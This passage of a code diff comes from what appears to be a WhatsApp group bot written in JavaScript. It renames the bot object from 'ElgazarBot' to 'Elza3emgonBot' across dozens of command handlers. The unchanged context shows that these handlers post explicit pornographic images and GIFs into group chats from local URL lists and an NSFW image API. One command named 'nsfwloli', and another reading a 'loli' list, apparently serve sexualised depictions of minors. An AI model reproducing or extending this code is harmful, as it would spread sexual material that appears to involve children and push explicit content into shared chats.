-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'blowjob':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5862,7 +5862,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'cuckold':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5871,7 +5871,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'cum':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5880,7 +5880,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'eba':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5889,7 +5889,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ero':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5898,7 +5898,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'femdom':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5907,7 +5907,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'foot':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5916,7 +5916,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'gangbang':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5925,7 +5925,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'glasses':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5934,7 +5934,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'hentai':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5943,7 +5943,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'jahy':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5952,7 +5952,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'مانجا':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5961,7 +5961,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'masturbation':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5970,7 +5970,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'neko-hentai':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5979,7 +5979,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'neko-hentai2':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5988,7 +5988,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'nsfwloli':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5997,7 +5997,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'orgy':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6006,7 +6006,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'panties':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6015,7 +6015,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'pussy':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6024,7 +6024,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'tentacles':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6033,7 +6033,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'thights':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6042,7 +6042,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'yuri':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6051,7 +6051,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'zettai':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6060,7 +6060,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'gifblowjob':
 if (!m.isGroup) return m.reply(mess.group)
@@ -6069,7 +6069,7 @@ m.reply(mess.wait)
   let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
     var bobuff = await fetchBuffer(assss.data.url)
     var bogif = await buffergif(bobuff)
-    await ElgazarBot.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
+    await Elza3emgonBot.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
     })
     break
 case 'gifhentai':
@@ -6078,7 +6078,7 @@ if (!AntiNsfw) return m.reply(mess.nsfw)
 m.reply(mess.wait)
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
 var xeonyresultx = pickRandom(ahegaonsfw)
-    await ElgazarBot.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
+    await Elza3emgonBot.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
     })
     break
 case'slap2':
@@ -6094,7 +6094,7 @@ const media = new MessageMedia(
     mediaData.toString("base64")
 );
 const mention = msg
-const mentionedId = await ElgazarBot.getName(mention.mentionedIds)
+const mentionedId = await Elza3emgonBot.getName(mention.mentionedIds)
 ctv = `@${contacts.number} *Slapped* @${mentionedId.number}`
 const ahh = []
 m.reply(media,m.chat , {mentions:[contacts,mentionedId], sendVideoAsGif:true, caption: ctv}).then((r) => {
@@ -6111,7 +6111,7 @@ const media = new MessageMedia(
     'video/mp4', 
     mediaData.toString("base64")
 );
-const contact1 = await ElgazarBot.getName(qmid)
+const contact1 = await Elza3emgonBot.getName(qmid)
 ctv = `@${contacts.number} *Slapped* @${contact1.number} `
 m.reply(media,m.chat , {mentions:[contacts,contact1 ], sendVideoAsGif:true, caption: ctv}).then((r) => {
 })
@@ -6131,7 +6131,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, button1ssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button1ssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6148,7 +6148,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break   
@@ -6164,7 +6164,7 @@ m.reply(mess.wait)
   buttons: xxhnekobot,
   headerType: 1
   }      
-            await ElgazarBot.sendMessage(m.chat, xx1button3Messages, { quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, xx1button3Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6181,7 +6181,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6198,7 +6198,7 @@ m.reply(mess.wait)
       buttons: wbutsss,
       headerType: 4
       }
-            await ElgazarBot.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
                     return('Error!')
                 })               
                 break
@@ -6215,7 +6215,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonsosMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonsosMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break   
@@ -6232,7 +6232,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, btutttonssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, btutttonssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6249,7 +6249,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, xxbuttonssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, xxbuttonssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6266,7 +6266,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6283,7 +6283,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonussMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonussMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6300,7 +6300,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, bxxuttonssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, bxxuttonssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6317,7 +6317,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttoxnssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttoxnssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6336,7 +6336,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonssxMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonssxMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6353,7 +6353,7 @@ m.reply(mess.wait)
       buttons: wbutt1sss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, button1ssxMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button1ssxMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6370,7 +6370,7 @@ m.reply(mess.wait)
       buttons: wbuttszzss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsxMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsxMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6387,7 +6387,7 @@ m.reply(mess.wait)
       buttons: wbuttszz12ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx12Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx12Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6404,7 +6404,7 @@ m.reply(mess.wait)
       buttons: wbuttszz123ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx123Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx123Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6421,7 +6421,7 @@ m.reply(mess.wait)
       buttons: wbuttszz124ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx124Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx124Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6438,7 +6438,7 @@ m.reply(mess.wait)
       buttons: wbuttszz125ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx125Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx125Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6455,7 +6455,7 @@ m.reply(mess.wait)
       buttons: wbuttszz126ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx126Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx126Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6472,7 +6472,7 @@ m.reply(mess.wait)
       buttons: wbuttszz127ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx127Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx127Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6489,7 +6489,7 @@ m.reply(mess.wait)
       buttons: wbuttszz128ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx128Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx128Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6506,7 +6506,7 @@ m.reply(mess.wait)
       buttons: wbuttszz129ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx129Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx129Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6523,7 +6523,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1210ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1210Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1210Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6540,7 +6540,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1211ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1211Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1211Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6557,7 +6557,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1212ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1212Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1212Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6574,7 +6574,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1213ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1213Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1213Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6591,7 +6591,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1214ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1214Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1214Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6608,7 +6608,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1215ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1215Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1215Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6625,7 +6625,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1216ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1216Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1216Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6642,7 +6642,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1217ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1217Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1217Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6659,7 +6659,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1218ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1218Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1218Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6676,7 +6676,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1219ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1219Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1219Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6693,7 +6693,7 @@ m.reply(mess.wait)
       buttons: wbuttszz1220ss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonszzsx1220Messages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonszzsx1220Messages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6710,7 +6710,7 @@ var wbutsss = [
           buttons: wbutsss,
      headerType: 4
                       }
-await ElgazarBot.sendMessage(m.chat,buttonsesMessage, { quoted:m }).catch(err => {
+await Elza3emgonBot.sendMessage(m.chat,buttonsesMessage, { quoted:m }).catch(err => {
      return('Error!')
     })               
 break
@@ -6727,7 +6727,7 @@ var wbutsss = [
           buttons: wbutsss,
      headerType: 4
                       }
-await ElgazarBot.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
+await Elza3emgonBot.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
      return('Error!')
     })               
 break     
@@ -6744,7 +6744,7 @@ m.reply(mess.wait)
   buttons: wbuttsss,
   headerType: 2
   }       
-            await ElgazarBot.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -6754,7 +6754,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/loli.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'تانجيرو':
